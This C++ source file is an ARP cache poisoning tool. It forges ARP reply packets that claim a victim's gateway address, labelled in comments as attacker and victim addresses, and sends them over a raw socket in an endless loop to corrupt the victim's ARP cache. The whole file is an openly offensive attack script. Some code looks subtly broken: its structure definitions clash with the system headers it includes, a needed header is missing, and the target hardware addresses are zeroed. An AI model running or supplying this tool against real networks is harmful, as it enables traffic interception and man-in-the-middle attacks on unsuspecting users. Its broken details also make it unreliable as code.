#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>

// Define the ARP header structure
struct ethhdr {
    unsigned char h_dest[6];
    unsigned char h_source[6];
    unsigned short h_proto;
};

struct arphdr {
    unsigned short hw_type;
    unsigned short protocol_type;
    unsigned char hw_size;
    unsigned char protocol_size;
    unsigned short op;
    unsigned char sender_hw_addr[6];
    unsigned char sender_ip_addr[4];
    unsigned char target_hw_addr[6];
    unsigned char target_ip_addr[4];
};

// Function to create the ARP reply packet
void create_arp_reply(unsigned char *packet, unsigned char *src_mac, unsigned char *dst_mac,
                      const char *src_ip, const char *dst_ip) {
    struct ethhdr *eth = (struct ethhdr *)packet;
    struct arphdr *arp = (struct arphdr *)(packet + sizeof(struct ethhdr));

    // Ethernet Header
    memcpy(eth->h_dest, dst_mac, 6); // Destination MAC
    memcpy(eth->h_source, src_mac, 6); // Source MAC
    eth->h_proto = htons(ETH_P_ARP);  // ARP protocol

    // ARP Header
    arp->hw_type = htons(1);  // Ethernet
    arp->protocol_type = htons(ETH_P_IP);  // IP
    arp->hw_size = 6;  // MAC address size
    arp->protocol_size = 4;  // IP address size
    arp->op = htons(2);  // ARP reply

    // ARP Sender and Target Info
    memcpy(arp->sender_hw_addr, src_mac, 6); // Attacker MAC
    inet_pton(AF_INET, src_ip, arp->sender_ip_addr); // Attacker IP
    memset(arp->target_hw_addr, 0, 6); // Victim MAC is initially 0
    inet_pton(AF_INET, dst_ip, arp->target_ip_addr); // Victim IP
}

// Function to send continuous ARP replies to poison the ARP cache
void send_continuous_arp_reply(const char *interface, const char *src_ip, const char *dst_ip,
                                const char *src_mac_str, const char *dst_mac_str) {
    // Convert MAC addresses from string to byte arrays
    unsigned char src_mac[6], dst_mac[6];
    sscanf(src_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &src_mac[0], &src_mac[1], &src_mac[2],
           &src_mac[3], &src_mac[4], &src_mac[5]);
    sscanf(dst_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &dst_mac[0], &dst_mac[1], &dst_mac[2],
           &dst_mac[3], &dst_mac[4], &dst_mac[5]);

    // Create raw socket
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    // Get the network interface index
    struct ifreq if_idx;
    strncpy(if_idx.ifr_name, interface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &if_idx) < 0) {
        perror("Interface index fetch failed");
        return;
    }

    // Prepare ARP reply packet
    unsigned char packet[42]; // Ethernet (14 bytes) + ARP (28 bytes)
    create_arp_reply(packet, src_mac, dst_mac, src_ip, dst_ip);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(struct sockaddr_ll));
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_idx.ifr_ifindex; // Interface index

    while (true) { // Continuous loop to send ARP reply
        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(struct sockaddr_ll)) == -1) {
            perror("Send failed");
        } else {
            std::cout << "Sent ARP reply to " << dst_ip << std::endl;
        }
        sleep(1); // Delay for 1 second before sending the next ARP reply
    }

    close(sock);
}

int main() {
    const char *interface = "eth0"; // Network interface (adjust for your system)
    const char *src_ip = "192.168.1.1";  // Attacker's IP address
    const char *dst_ip = "192.168.1.5";  // Victim's IP address
    const char *src_mac = "00:11:22:33:44:55"; // Attacker's MAC address
    const char *dst_mac = "00:00:00:00:00:00"; // Victim's MAC address (initially 0)

    send_continuous_arp_reply(interface, src_ip, dst_ip, src_mac, dst_mac);
    return 0;
}
